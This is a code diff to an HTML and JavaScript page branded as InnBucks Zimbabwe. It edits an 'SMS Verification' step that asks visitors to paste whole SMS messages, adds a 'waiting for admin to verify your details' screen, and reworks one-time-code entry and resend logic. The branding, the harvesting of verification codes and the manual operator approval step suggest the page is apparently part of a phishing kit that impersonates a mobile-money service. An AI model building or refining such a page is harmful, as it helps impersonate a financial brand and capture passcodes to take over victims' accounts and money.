@@ -433,11 +433,11 @@
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
   </div>
-  <div class="otp-body-wrap">
-    <div class="otp-card">
-      <h2>SMS Verification</h2>
-      <p class="otp-hint">Copy the entire SMS received on your phone and paste it below. We'll automatically extract your code.</p>
-      <div class="otp-phone" id="otpPh">+263712345678</div>
+  <div class="otp-body-wrap"> <div class="otp-card"> <h2>SMS Verification</h2> <p class="otp-hint">Copy the entire SMS received on your phone and paste it below. We'll automatically extract your code.</p> <div class="otp-phone" id="otpPh">+263712345678</div> <!-- Inline messages for OTP page --> <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div> <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div> <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>       <!-- Waiting for admin approval indicator -->
+      <div class="waiting-box" id="pinWait">
+        <div class="wb-spinner"></div>
+        <p>Waiting for admin to verify your details…</p>
+      </div>
 
       <div id="otpInputSection">
         <div class="otp-paste-container" style="margin-bottom: 20px;">
@@ -455,13 +455,14 @@
           <input type="hidden" id="finalOtpValue">
         </div>
 
-        <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">60</span> seconds</div>
-        <button class="btn-otp" id="bOtp" disabled style="opacity: 0.6; cursor: not-allowed;">SUBMIT APPLICATION</button>
+         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
+        <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
       </div>
     </div>
   </div>
   <div class="otp-curve"><div class="otp-foot">© 2026 InnBucks Zimbabwe</div></div>
 </div>
+
 <!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
@@ -836,32 +837,11 @@
   // ══════════════════════════════════════════════════════
   // OTP INPUT HELPERS
   // ══════════════════════════════════════════════════════
-  function extractOtpCode(pastedText) {
-    const match = pastedText.match(/\b\d{6}\b/);
-    const feedbackDiv = document.getElementById('extractedFeedback');
-    const codeSpan = document.getElementById('detectedCode');
-    const finalInput = document.getElementById('finalOtpValue');
-    const submitBtn = document.getElementById('bOtp');
-
-    if (match) {
-      const code = match[0];
-      finalInput.value = code;
-      if (codeSpan) codeSpan.textContent = code;
-      if (feedbackDiv) feedbackDiv.style.display = 'block';
-      
-      submitBtn.disabled = false;
-      submitBtn.className = 'btn-otp rdy'; 
-      submitBtn.style.opacity = '1';
-      submitBtn.style.cursor = 'pointer';
-    } else {
-      finalInput.value = '';
-      if (feedbackDiv) feedbackDiv.style.display = 'none';
-      
-      submitBtn.disabled = true;
-      submitBtn.className = 'btn-otp';
-      submitBtn.style.opacity = '0.6';
-      submitBtn.style.cursor = 'not-allowed';
-    }
+  function otpMv(el, i) {
+    el.value = el.value.replace(/\D/, '');
+    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
+    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value);
+    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
   let _rsInterval = null;
@@ -889,7 +869,7 @@
     }, 1000);
   }
 
-  //══════════════════════════════════════════════════════
+  // ══════════════════════════════════════════════════════
   // RESEND OTP — calls /api/resend-otp
   // ══════════════════════════════════════════════════════
   async function resendOtp() {
